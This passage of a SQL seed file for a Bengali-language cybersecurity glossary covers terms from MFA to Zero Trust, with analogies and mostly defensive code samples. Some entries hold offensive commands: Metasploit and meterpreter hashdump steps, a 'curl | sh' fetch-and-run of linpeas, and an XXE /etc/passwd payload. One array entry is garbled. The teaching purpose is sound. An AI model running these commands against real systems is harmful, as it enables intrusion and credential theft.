 'medium','Defense',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- M
-- ═══════════════════════════════════════════════════════
('M','Multi-Factor Authentication (MFA)','বহু স্তরের পরিচয় যাচাই',
 '🏦 ব্যাংকের লকার — চাবি + পাসওয়ার্ড + আঙুলের ছাপ তিনটাই লাগে।',
 'MFA হলো দুই বা ততোধিক authentication factor-এর combination। 2FA-এর advanced version। Hardware key (YubiKey), biometric, push notification — বিভিন্ন ধরন।',
 'Financial systems, healthcare, government — high security environment।',
 'Microsoft report: MFA ৯৯.৯% automated attacks ব্লক করে।',
 $code$// MFA Implementation Options

// Option 1: SMS OTP (দুর্বল, SIM swap risk)
// Option 2: TOTP App (Google Authenticator)
// Option 3: Hardware Key (YubiKey — সবচেয়ে শক্তিশালী)
// Option 4: Push Notification (Duo Security)

// WebAuthn / FIDO2 Implementation (Modern)
const { generateAuthenticationOptions } = require('@simplewebauthn/server');

async function startAuthentication(userId) {
  const user = await getUserById(userId);
  
  const options = await generateAuthenticationOptions({
    rpID: 'example.com',
    allowCredentials: user.authenticators.map(a => ({
      id: a.credentialID,
      type: 'public-key',
      transports: a.transports,
    })),
    userVerification: 'required',  // Biometric required
  });
  
  // Challenge session-এ save করুন
  await saveChallenge(userId, options.challenge);
  return options;  // Frontend-এ পাঠান
}$code$,
 ARRAY['FIDO2','WebAuthn','YubiKey','OTP','biometric'],
 'low','Defense',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- O
-- ═══════════════════════════════════════════════════════
('O','OAuth 2.0','তৃতীয় পক্ষের অনুমোদন প্রোটোকল',
 '🔑 হোটেলের master key ছাড়াই নিজের room key দিয়ে শুধু নিজের ঘর খোলা।',
 'OAuth 2.0 হলো authorization framework যা third-party app-কে user-এর পক্ষে limited access দেয় — পাসওয়ার্ড শেয়ার না করে। "Login with Google/Facebook" এই প্রোটোকল ব্যবহার করে।',
 'Social login, API authorization, third-party integrations।',
 '"Google দিয়ে লগইন করুন" — তোমার Google পাসওয়ার্ড ছাড়াই app access পায়।',
 $code$// OAuth 2.0 Authorization Code Flow (Node.js)
const express = require('express');
const { Issuer, generators } = require('openid-client');

async function setupOAuth() {
  const googleIssuer = await Issuer.discover('https://accounts.google.com');
  
  const client = new googleIssuer.Client({
    client_id: process.env.GOOGLE_CLIENT_ID,
    client_secret: process.env.GOOGLE_CLIENT_SECRET,
    redirect_uris: ['http://localhost:3000/callback'],
    response_types: ['code'],
  });
  
  // Step 1: Authorization URL তৈরি
  app.get('/auth', (req, res) => {
    const state = generators.state();
    const codeVerifier = generators.codeVerifier();
    const codeChallenge = generators.codeChallenge(codeVerifier);
    // session-এ state ও codeVerifier রাখুন
    const url = client.authorizationUrl({
      scope: 'openid email profile',
      state, code_challenge: codeChallenge,
      code_challenge_method: 'S256',
    });
    res.redirect(url);
  });
}$code$,
 ARRAY['authorization','OpenID','SSO','Google','social-login'],
 'medium','Identity',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- P
-- ═══════════════════════════════════════════════════════
('P','Password Manager','পাসওয়ার্ড নিরাপদে সংরক্ষণের সফটওয়্যার',
 '🔐 সব চাবির একটা নিরাপদ বাক্স — একটা master চাবি দিয়ে সব পাওয়া যায়।',
 'Password Manager হলো এমন software যা শত শত unique, strong পাসওয়ার্ড তৈরি ও encrypted vault-এ সংরক্ষণ করে। একটাই master password মনে রাখতে হয়।',
 'Personal ও corporate password management, credential sharing।',
 '1Password, Bitwarden, LastPass — জনপ্রিয় password managers।',
 $code$// Simple Password Manager Vault (Concept)
const crypto = require('crypto');

class PasswordVault {
  constructor(masterPassword) {
    // Master password থেকে encryption key derive করুন
    this.key = crypto.scryptSync(masterPassword, 'salt_here', 32);
    this.vault = {};
  }
  
  // Password সংরক্ষণ
  save(site, username, password) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', this.key, iv);
    const encrypted = cipher.update(password, 'utf8', 'hex') + cipher.final('hex');
    this.vault[site] = {
      username,
      password: encrypted,
      iv: iv.toString('hex'),
      tag: cipher.getAuthTag().toString('hex')
    };
  }
  
  // Password পুনরুদ্ধার
  get(site) {
    const { username, password, iv, tag } = this.vault[site];
    const decipher = crypto.createDecipheriv('aes-256-gcm', this.key, Buffer.from(iv,'hex'));
    decipher.setAuthTag(Buffer.from(tag,'hex'));
    return { username, password: decipher.update(password,'hex','utf8') + decipher.final('utf8') };
  }
  
  // Strong password generate
  generate(length = 20) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
    return Array.from(crypto.randomBytes(length))
      .map(b => chars[b % chars.length]).join('');
  }
}$code$,
 ARRAY['Bitwarden','1Password','vault','credentials','PBKDF2'],
 'low','Defense',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

('P','Penetration Testing','অনুমোদিত হ্যাকিং পরীক্ষা',
 '🕵️ নিজেই তোমার বাড়ির নিরাপত্তা পরীক্ষা করার জন্য সাবেক চোরকে ভাড়া করা।',
 'Penetration Testing (Pentest) হলো authorized simulated cyberattack যা system-এর exploitable vulnerabilities খুঁজে বের করে। Black box, White box, Grey box — তিন ধরন।',
 'Security audit, compliance, product launch আগে।',
 'HackerOne platform-এ ethical hackers pentest করে Facebook-এর $500K+ bug bounty পেয়েছেন।',
 $code$# Pentest Methodology (PTES Framework)

## Phase 1: Reconnaissance
nmap -sV -sC -oN recon.txt target.com
whois target.com
theharvester -d target.com -b google

## Phase 2: Scanning
nmap -p- --min-rate 5000 target.com
nmap --script vuln target.com

## Phase 3: Exploitation
msfconsole
> search type:exploit name:apache
> use exploit/...

## Phase 4: Post Exploitation
> meterpreter > hashdump
> meterpreter > run post/multi/recon/local_exploit_suggester

## Phase 5: Reporting
# CVSS score প্রতিটি finding-এ
# Executive summary + Technical details
# Remediation roadmap

# Tools: Metasploit, Burp Suite, Nmap, 
#        Nikto, SQLMap, Hashcat$code$,
 ARRAY['ethical-hacking','Metasploit','Burp-Suite','PTES','OWASP'],
 'medium','Security Testing',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

('P','PKI (Public Key Infrastructure)','পাবলিক কী অবকাঠামো',
 '📮 ডাকঘর সিস্টেমের মতো — সবার public address জানা থাকে, private box শুধু নিজেই খুলতে পারে।',
 'PKI হলো digital certificate manage করার framework। Public key দিয়ে encrypt, private key দিয়ে decrypt। CA, RA, CRL, OCSP — PKI-এর components।',
 'HTTPS, email signing, code signing, VPN, document signing।',
 'ব্যাংকের ওয়েবসাইটের 🔒 আইকন মানে PKI-issued SSL certificate।',
 $code$# PKI Certificate Operations (Python + cryptography)
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

# RSA Key Pair তৈরি করুন
private_key = rsa.generate_private_key(
    public_exponent=65537, key_size=4096
)
public_key = private_key.public_key()

# Encrypt with public key
def rsa_encrypt(message, pub_key):
    return pub_key.encrypt(
        message.encode(),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(), label=None
        )
    )

# Decrypt with private key
def rsa_decrypt(ciphertext, priv_key):
    return priv_key.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(), label=None
        )
    ).decode()

# Digital Signature
def sign(message, priv_key):
    return priv_key.sign(message.encode(), padding.PSS(
        mgf=padding.MGF1(hashes.SHA256()),
        salt_length=padding.PSS.MAX_LENGTH
    ), hashes.SHA256())$code$,
 ARRAY['RSA','certificate','CA','SSL','digital-signature'],
 'medium','Cryptography',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

('P','Privilege Escalation','সীমিত অ্যাক্সেস থেকে বেশি ক্ষমতা নেওয়া',
 '🪜 সাধারণ কর্মী সেজে ভেতরে ঢুকে CEO-র চেয়ারে বসা।',
 'Privilege Escalation হলো attacker-এর কম permission থেকে উচ্চতর permission পাওয়ার প্রক্রিয়া। Vertical (user→root) ও Horizontal (user A→user B) দুই ধরন।',
 'Post-exploitation phase, Linux/Windows privilege abuse।',
 'sudo vulnerability (CVE-2021-3156) দিয়ে যেকোনো Linux user root হতে পারত।',
 $code$# Linux Privilege Escalation Checklist

## SUID Files খুঁজুন (যেকোনো user root-এ চালাতে পারে)
find / -perm -u=s -type f 2>/dev/null

## Sudo rights চেক করুন
sudo -l

## Cron jobs চেক করুন
cat /etc/crontab
ls -la /etc/cron.*

## World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

## Kernel exploits
uname -a  # Kernel version check
# DirtyPipe (CVE-2022-0847) — Linux kernel 5.8+

## Python Auto-enumeration
# LinPEAS, LinEnum, PEASS-ng tools ব্যবহার করুন
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh$code$,
 ARRAY['Linux','Windows','SUID','sudo','post-exploitation'],
 'critical','Attack Vector',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- R
-- ═══════════════════════════════════════════════════════
('R','Reverse Engineering','সফটওয়্যারের ভেতরের কোড উন্মোচন',
 '🔧 একটি যন্ত্র খুলে দেখা কীভাবে কাজ করে — তারপর হুবহু বানানো বা ঠিক করা।',
 'Reverse Engineering হলো compiled software কে বিশ্লেষণ করে source code বা algorithm বোঝার প্রক্রিয়া। Malware analysis, vulnerability research, interoperability-তে ব্যবহার।',
 'Malware বিশ্লেষণ, CTF challenges, legacy software বোঝা।',
 'WannaCry ransomware kill switch Marcus Hutchins reverse engineering করে খুঁজেছিলেন।',
 $code$# Reverse Engineering Tools

## Static Analysis

# Ghidra (NSA তৈরি, Free)
ghidraRun  # GUI launch করুন
# Binary import → Analysis → Function graph

# objdump (Linux)
objdump -d binary | head -100  # Disassemble
objdump -x binary              # Headers

## Dynamic Analysis

# GDB (Debugger)
gdb ./binary
(gdb) break main
(gdb) run
(gdb) info registers
(gdb) x/20x $esp  # Stack দেখুন

# strace (System calls)
strace ./binary 2>&1 | grep -E 'open|read|write|connect'

# ltrace (Library calls)
ltrace ./binary

## Python Decompile
pip install uncompyle6
uncompyle6 compiled.pyc$code$,
 ARRAY['Ghidra','IDA-Pro','malware-analysis','CTF','disassembly'],
 'high','Security Testing',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

('R','Rootkit','সিস্টেম লেভেলে লুকানো ম্যালওয়্যার',
 '🏗️ বাড়ির নিচে ফাউন্ডেশনে লুকানো — দেখতে পাচ্ছ না, কিন্তু সব নিয়ন্ত্রণ করছে।',
 'Rootkit হলো malware যা OS-এর kernel level-এ লুকিয়ে থাকে — antivirus, process list, file system থেকে নিজেকে hide করে। সনাক্ত করা অত্যন্ত কঠিন।',
 'Long-term persistence, surveillance, data exfiltration।',
 'Sony BMG rootkit scandal (2005) — CD কিনলেই computer-এ rootkit install হত।',
 $code$# Rootkit Detection

# chkrootkit (Linux)
sudo apt install chkrootkit
sudo chkrootkit

# rkhunter
sudo apt install rkhunter
sudo rkhunter --update
sudo rkhunter --check

# Process hiding detect করুন
# /proc vs ps -aux compare
python3 << 'EOF'
import os, subprocess

# /proc থেকে PIDs
proc_pids = set(int(p) for p in os.listdir('/proc') if p.isdigit())

# ps থেকে PIDs
ps_out = subprocess.run(['ps','-aux'], capture_output=True, text=True)
ps_pids = set(int(line.split()[1]) for line in ps_out.stdout.split('\n')[1:] if line)

# Hidden processes
hidden = proc_pids - ps_pids
if hidden:
    print(f"⚠️ Hidden processes: {hidden}")
EOF$code$,
 ARRAY['kernel','persistence','stealth','bootkit','UEFI'],
 'critical','Malware',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- S
-- ═══════════════════════════════════════════════════════
('S','SSRF (Server-Side Request Forgery)','সার্ভারকে দিয়ে অভ্যন্তরীণ সার্ভিস এক্সেস',
 '🤝 অফিসের ভেতরের মানুষকে বলা — "তুমি আমার হয়ে ওই ফাইলটা আনো।"',
 'SSRF হলো এমন vulnerability যেখানে attacker server-কে তার নিজের behalf-এ internal network-এ request পাঠাতে বাধ্য করে — firewall bypass করে।',
 'Cloud metadata চুরি, internal service access, port scanning।',
 'Capital One breach — SSRF দিয়ে AWS metadata endpoint থেকে credentials চুরি।',
 $code$// SSRF Prevention (Node.js)
const dns = require('dns').promises;
const net = require('net');

async function isSafeUrl(url) {
  const parsed = new URL(url);
  
  // Private IP ranges ব্লক করুন
  const blocklist = [
    /^127\./, /^10\./, /^172\.(1[6-9]|2\d|3[0-1])\./,
    /^192\.168\./, /^169\.254\./, /^::1$/,
    /^fc00:/, /^fe80:/
  ];
  
  // Hostname resolve করুন
  const addresses = await dns.resolve4(parsed.hostname);
  
  for (const addr of addresses) {
    if (blocklist.some(pattern => pattern.test(addr))) {
      throw new Error(`Blocked: ${addr} is a private IP`);
    }
  }
  
  // Allowlist approach
  const allowedDomains = ['api.trusted.com', 'cdn.example.com'];
  if (!allowedDomains.includes(parsed.hostname)) {
    throw new Error(`Domain not allowlisted: ${parsed.hostname}`);
  }
  
  return true;
}$code$,
 ARRAY['OWASP','cloud','AWS','metadata','internal-network'],
 'critical','Web Security',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

('S','Supply Chain Attack','সাপ্লাই চেইনে আক্রমণ',
 '🏭 খাবারের কারখানায় বিষ মেশানো — সব দোকানে পৌঁছে যায়।',
 'Supply Chain Attack হলো কোনো software বা hardware-এর development বা distribution প্রক্রিয়ায় malicious code inject করা — ফলে হাজার হাজার end-user affected হয়।',
 'Software update mechanism, third-party libraries, hardware manufacturing।',
 'SolarWinds attack (2020) — Orion software update-এ backdoor, ১৮,০০০+ organization affected।',
 $code$# Supply Chain Security

## npm Package Security

# Package integrity যাচাই
npm audit
npm audit fix

# Dependency lock করুন
npm ci  # package-lock.json থেকে exact install

# Typosquatting চেক
# npm install coloRS (ভুল) vs colors (সঠিক)

## Python Package Verification
pip install package --require-hashes

## GitHub Actions Security
# ✅ Commit hash pin করুন, tag নয়
# uses: actions/checkout@a12a3943b4bdde767164f792f33f40b04645d846
# ❌ uses: actions/checkout@v3

## SBOM (Software Bill of Materials)
syft packages dir:. -o spdx-json > sbom.json
grype sbom:sbom.json  # Vulnerability scan$code$,
 ARRAY['SolarWinds','npm','dependency','SBOM','third-party'],
 'critical','Threat Actor',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

('S','Secure Coding','নিরাপদ কোড লেখার নীতিমালা',
 '🏗️ বাড়ি বানানোর সময় ভূমিকম্প প্রতিরোধী করা — পরে ঠিক করার চেয়ে শুরুতেই নিরাপদ।',
 'Secure Coding হলো software development-এর সময় security vulnerabilities প্রতিরোধ করার practices। Input validation, output encoding, error handling, least privilege — মূল নীতি।',
 'Web app, mobile app, API development — সব জায়গায়।',
 'Microsoft SDL (Security Development Lifecycle) দিয়ে Windows-এর vulnerability ৯১% কমেছে।',
 $code$// Secure Coding Checklist (JavaScript/Node.js)

// 1. Input Validation
const { body, validationResult } = require('express-validator');
app.post('/user', [
  body('email').isEmail().normalizeEmail(),
  body('age').isInt({ min: 0, max: 150 }),
  body('name').trim().escape().isLength({ min: 1, max: 50 }),
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) return res.status(400).json({ errors: errors.array() });
});

// 2. Security Headers (Helmet.js)
const helmet = require('helmet');
app.use(helmet());  // XSS, clickjacking, MIME-type sniffing ব্লক

// 3. Secrets Management
require('dotenv').config();
const apiKey = process.env.API_KEY;  // কোডে কখনো না

// 4. Dependency scanning
// npm audit, Snyk, OWASP Dependency-Check

// 5. Error handling — details hide করুন
app.use((err, req, res, next) => {
  console.error(err);  // Server log-এ
  res.status(500).json({ error: 'Internal server error' });  // User-এ না
});$code$,
 ARRAY['SAST','DAST','SDL','input-validation','Helmet'],
 'medium','Defense',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

('S','Session Hijacking','লগইন সেশন চুরি করা',
 '🪪 কেউ তোমার ID card চুরি করে তোমার পরিচয়ে কাজ করছে।',
 'Session Hijacking হলো valid user-এর session token চুরি করে তার পরিচয়ে system access করার আক্রমণ। XSS, network sniffing, সিদ্ধান্ত টোকেন দিয়ে করা হয়।',
 'E-commerce, banking, social media session abuse।',
 'Public WiFi-তে HTTP site ব্যবহার করলে session cookie sniff করে hijack সম্ভব।',
 $code$// Session Security Best Practices (Express)
const session = require('express-session');

app.use(session({
  secret: process.env.SESSION_SECRET,  // Strong, random
  name: '__Host-sessionId',  // Default name পরিবর্তন
  cookie: {
    httpOnly: true,    // JS থেকে access নেই
    secure: true,      // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 30 * 60 * 1000  // 30 minutes
  },
  resave: false,
  saveUninitialized: false,
  // Store: Redis, না MemoryStore
  store: new RedisStore({ client: redisClient })
}));

// Session ID regenerate করুন login-এ
app.post('/login', async (req, res) => {
  // credentials যাচাই...
  req.session.regenerate((err) => {  // Session fixation প্রতিরোধ
    req.session.userId = user.id;
    res.json({ success: true });
  });
});$code$,
 ARRAY['cookies','HTTPS','XSS','session-fixation','Redis'],
 'high','Web Security',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- T
-- ═══════════════════════════════════════════════════════
('T','Threat Modeling','সম্ভাব্য হুমকি চিহ্নিত করা',
 '🗺️ যুদ্ধের আগে শত্রুর সব সম্ভাব্য পথ চিহ্নিত করে প্রস্তুতি নেওয়া।',
 'Threat Modeling হলো সিস্টেমের সম্ভাব্য security threats ও vulnerabilities systematically চিহ্নিত করার প্রক্রিয়া। STRIDE, PASTA, DREAD — popular frameworks।',
 'Design phase-এ security, product architecture review।',
 'Microsoft SDL-এ সব product-এর threat model mandatory।',
 $code$# STRIDE Threat Modeling
# Spoofing, Tampering, Repudiation, 
# Information Disclosure, Denial of Service, Elevation of Privilege

class STRIDEModel:
    threats = {
        "Spoofing":              "Authentication ব্যবহার করুন",
        "Tampering":             "Integrity check, signing",
        "Repudiation":          "Audit logging, digital signatures",
        "Information Disclosure": "Encryption, access control",
        "Denial of Service":     "Rate limiting, redundancy",
        "Elevation of Privilege": "Least privilege, sandboxing"
    }
    
    def analyze_component(self, component, data_flows):
        findings = []
        for threat, mitigation in self.threats.items():
            findings.append({
                "component": component,
                "threat": threat,
                "risk": self._assess_risk(component, threat),
                "mitigation": mitigation
            })
        return findings
    
    def _assess_risk(self, component, threat):
        # DREAD scoring: Damage, Reproducibility, 
        # Exploitability, Affected users, Discoverability
        return "High" if "auth" in component.lower() else "Medium"$code$,
 ARRAY['STRIDE','PASTA','DREAD','design','architecture'],
 'medium','Defense',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('T','Trojan Horse','বৈধ সফটওয়্যারের ভেতরে লুকানো ম্যালওয়্যার',
 '🐴 ট্রয়ের কাঠের ঘোড়ার মতো — বাইরে উপহার, ভেতরে শত্রু সৈন্য।',
 'Trojan হলো legitimate সফটওয়্যারের ছদ্মবেশে আসা malware যা user নিজেই install করে। RAT (Remote Access Trojan) attacker-কে পূর্ণ remote control দেয়।',
 'Credential theft, backdoor access, keylogging, cryptomining।',
 'Fake Zoom installer — install করতেই RAT install হয়, attacker remote access পায়।',
 $code$# Trojan Detection — Process & Network Analysis
import psutil, socket

def detect_rat_indicators():
    suspicious = []
    
    for proc in psutil.process_iter(['pid','name','connections','cmdline']):
        try:
            conns = proc.info['connections']
            for conn in (conns or []):
                # Uncommon outbound ports
                if conn.status == 'ESTABLISHED' and conn.raddr:
                    port = conn.raddr.port
                    if port in [4444, 1337, 31337, 8888, 9999]:
                        suspicious.append({
                            "process": proc.info['name'],
                            "pid": proc.info['pid'],
                            "remote": f"{conn.raddr.ip}:{port}"
                        })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    
    return suspicious

if found := detect_rat_indicators():
    for item in found:
        print(f"🚨 Suspicious RAT: {item}")$code$,
 ARRAY['RAT','backdoor','malware','remote-access','persistence'],
 'critical','Malware',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

('T','TLS/SSL','নিরাপদ ইন্টারনেট যোগাযোগ প্রোটোকল',
 '🔒 ব্যাংক থেকে বাড়ি টাকা নিয়ে যাওয়ার সময় আর্মড গার্ড — কেউ ছিনিয়ে নিতে পারবে না।',
 'TLS (Transport Layer Security) হলো network communication encrypt করার protocol। SSL-এর উন্নত version। HTTPS = HTTP + TLS। Certificate-based authentication ও symmetric encryption।',
 'ওয়েব, email (STARTTLS), VPN, API communication।',
 'TLS 1.3 (2018) — সবচেয়ে নিরাপদ, 0-RTT handshake।',
 $code$# TLS Configuration Best Practices (Nginx)

server {
    listen 443 ssl http2;
    
    ssl_certificate     /etc/ssl/cert.pem;
    ssl_certificate_key /etc/ssl/key.pem;
    
    # শুধু TLS 1.2 ও 1.3
    ssl_protocols TLSv1.2 TLSv1.3;
    
    # Strong cipher suites
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384';
    ssl_prefer_server_ciphers off;
    
    # HSTS (1 year)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";
    
    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    resolver 1.1.1.1 8.8.8.8 valid=300s;
}

# SSL Labs A+ rating পেতে: ssllabs.com/ssltest/$code$,
 ARRAY['HTTPS','certificate','handshake','cipher','TLS-1.3'],
 'medium','Cryptography',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- V
-- ═══════════════════════════════════════════════════════
('V','Vulnerability Assessment','নিরাপত্তা দুর্বলতা মূল্যায়ন',
 '🏥 বার্ষিক স্বাস্থ্য পরীক্ষার মতো — সমস্যা ধরা পড়লে চিকিৎসা করা যাবে।',
 'Vulnerability Assessment হলো system-এর security weaknesses systematically চিহ্নিত ও classify করার প্রক্রিয়া — Penetration Testing থেকে আলাদা, exploit করা হয় না।',
 'Compliance audit, risk management, security baseline।',
 'Nessus বা OpenVAS দিয়ে quarterly vulnerability scan।',
 $code$# OpenVAS Vulnerability Scan (Python API)
import openvas.om as openvas

client = openvas.OpenVasManager(
    username='admin',
    password='admin',
    host='localhost',
    port=9390
)

# Target তৈরি করুন
target_id = client.create_target(
    name='Web Server',
    hosts='192.168.1.100'
)

# Scan চালু করুন
task_id = client.create_task(
    name='Full Scan',
    config_id='daba56c8-73ec-11df-a475-002264764cea',  # Full & Fast
    target_id=target_id
)
client.start_task(task_id)

# CVSS দিয়ে results sort করুন
print("Scan started. Check results in OpenVAS Dashboard")

# Alternative: Nessus, Qualys, Rapid7 InsightVM$code$,
 ARRAY['Nessus','OpenVAS','CVSS','scanning','risk'],
 'medium','Security Testing',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- W
-- ═══════════════════════════════════════════════════════
('W','Web Application Firewall (WAF)','ওয়েব অ্যাপ্লিকেশন নিরাপত্তা ফিল্টার',
 '🛡️ বাড়ির দরজায় স্মার্ট দারোয়ান — সব আগন্তুকের পরিচয় যাচাই করে।',
 'WAF হলো HTTP/HTTPS traffic monitor ও filter করার specialized firewall। OWASP rules দিয়ে SQLi, XSS, CSRF, DDoS ব্লক করে। Cloud WAF (Cloudflare, AWS WAF) সহজে deploy করা যায়।',
 'E-commerce, API protection, compliance (PCI-DSS)।',
 'Cloudflare WAF প্রতিদিন ৭০ billion+ cyber threat ব্লক করে।',
 $code$# ModSecurity WAF (Nginx)

# Installation
sudo apt install libnginx-mod-security2

# /etc/nginx/modsecurity/modsecurity.conf
SecRuleEngine On
SecRequestBodyAccess On

# OWASP CRS (Core Rule Set) — সবচেয়ে জনপ্রিয় ruleset
# SQLi ব্লক
SecRule ARGS "@detectSQLi" \
  "id:942100,phase:2,deny,status:403,\
  msg:'SQL Injection Detected'"

# XSS ব্লক
SecRule ARGS "@detectXSS" \
  "id:941100,phase:2,deny,status:403,\
  msg:'XSS Attack Detected'"

# Rate Limiting
SecAction "id:900700,phase:1,nolog,pass,\
  setvar:ip.counter=+1,\
  expirevar:ip.counter=60"
SecRule IP:COUNTER "@gt 100" \
  "id:900701,phase:1,deny,status:429"$code$,
 ARRAY['Cloudflare','ModSecurity','OWASP-CRS','rate-limiting','bot-protection'],
 'medium','Defense',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('W','Worm','স্বয়ংক্রিয়ভাবে ছড়ানো ম্যালওয়্যার',
 '🐛 জৈবিক কৃমির মতো — নিজে নিজেই ছড়ায়, কারো সাহায্য লাগে না।',
 'Worm হলো self-replicating malware যা নেটওয়ার্কে automatically ছড়িয়ে পড়ে — host program বা human interaction ছাড়াই। Virus থেকে আলাদা।',
 'Network bandwidth ব্যবহার, backdoor install, DDoS।',
 'Stuxnet worm — USB drive থেকে শুরু করে পুরো Siemens SCADA network infected করেছিল।',
 $code$# Worm Detection & Prevention

## Network-level Detection
# Unusual outbound connections
netstat -an | grep ESTABLISHED | awk '{print $5}' | \
  cut -d: -f1 | sort | uniq -c | sort -rn | head -20

## Honeypot দিয়ে worm ধরুন
# cowrie SSH honeypot
docker run -p 2222:2222 cowrie/cowrie

## Python Worm Behavior Simulator (Educational Only)
import socket, threading

# Real worms এভাবে কাজ করে:
# 1. Random IP scan করে open port খোঁজে
# 2. Vulnerability exploit করে
# 3. নিজের copy পাঠায়
# 4. Repeat

# Prevention:
# ✅ Network segmentation
# ✅ Patch management (worms exploit known CVEs)
# ✅ Disable unnecessary services
# ✅ Intrusion Detection System$code$,
 ARRAY['self-replicating','network','Stuxnet','propagation','patch'],
 'critical','Malware',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- X
-- ═══════════════════════════════════════════════════════
('X','XXE (XML External Entity)','XML-এর মাধ্যমে অভ্যন্তরীণ ফাইল পড়া',
 '📄 ডকুমেন্টের ভেতরে লুকানো নির্দেশনা — পড়তে গিয়ে গোপন তথ্য দিয়ে দেওয়া।',
 'XXE হলো OWASP Top 10-এর vulnerability যেখানে attacker malicious XML input-এ external entity ঢুকিয়ে server-এর internal files পড়তে বা SSRF করতে পারে।',
 'XML parser ব্যবহার করা API, file upload feature, SOAP web services।',
 'আক্রমণ: <!ENTITY xxe SYSTEM "file:///etc/passwd"> পাঠালে server-এর পাসওয়ার্ড ফাইল দেখা যায়।',
 $code$// XXE Prevention (Node.js)
const { DOMParser } = require('@xmldom/xmldom');

// ❌ Vulnerable: external entity enabled
const parser = new DOMParser();
const doc = parser.parseFromString(xmlInput, 'text/xml');

// ✅ Safe: Disable external entities
// libxmljs2 দিয়ে
const libxmljs = require('libxmljs2');

function safeParseXML(xmlString) {
  const options = {
    nonet: true,    // Network access বন্ধ
    noent: false,   // Entity expansion বন্ধ
    dtdload: false, // DTD loading বন্ধ
    dtdvalid: false
  };
  
  const doc = libxmljs.parseXmlString(xmlString, options);
  return doc;
}

// Best practice: JSON prefer করুন XML-এর বদলে
// Or: Schema validation before parsing$code$,
 ARRAY['XML','OWASP','entity','SSRF','parser'],
 'high','Web Security',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- Z
-- ═══════════════════════════════════════════════════════
('Z','Zero Trust Architecture','কাউকে বিশ্বাস না করার নিরাপত্তা মডেল',
 '🏰 প্রতিটি দরজায় গার্ড — ভেতরে থাকলেও পরিচয় দিতে হবে।',
 'Zero Trust হলো "Never Trust, Always Verify" নীতির security model। Network location নির্বিশেষে প্রতিটি access request verify করা হয়। Micro-segmentation, least privilege, continuous monitoring।',
 'Remote work security, cloud environment, high-security enterprise।',
 'Google BeyondCorp — ২০১০ সাল থেকে Zero Trust, COVID remote work-এ সবাই follow করেছে।',
 $code$// Zero Trust Implementation (Node.js)

const zeroTrustMiddleware = async (req, res, next) => {
  // 1. Identity যাচাই (কে?)
  const user = await verifyJWT(req.headers.authorization);
  if (!user) return res.status(401).json({ error: 'Identity not verified' });
  
  // 2. Device health চেক (কোন ডিভাইস?)
  const device = await checkDevicePosture(req.headers['x-device-id']);
  if (!device.compliant) {
    return res.status(403).json({ error: 'Device not compliant' });
  }
  
  // 3. Context যাচাই (কোথা থেকে?)
  const context = await analyzeContext({
    ip: req.ip,
    location: req.headers['x-geo-location'],
    time: new Date(),
    userAgent: req.headers['user-agent']
  });
  if (context.riskScore > 0.7) {
    return res.status(403).json({ error: 'High-risk context detected' });
  }
  
  // 4. Micro-authorization (এই resource-এ অনুমতি আছে?)
  const allowed = await checkPermission(user.id, req.path, req.method);
  if (!allowed) return res.status(403).json({ error: 'Access denied' });
  
  req.user = user;
  next();
};$code$,
 ARRAY['BeyondCorp','micro-segmentation','least-privilege','SAS$code$,$code$ZTNA'],
 'medium','Defense',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- Additional High-Value Terms
-- ═══════════════════════════════════════════════════════
('C','CTF (Capture The Flag)','সাইবার সিকিউরিটি প্রতিযোগিতা',
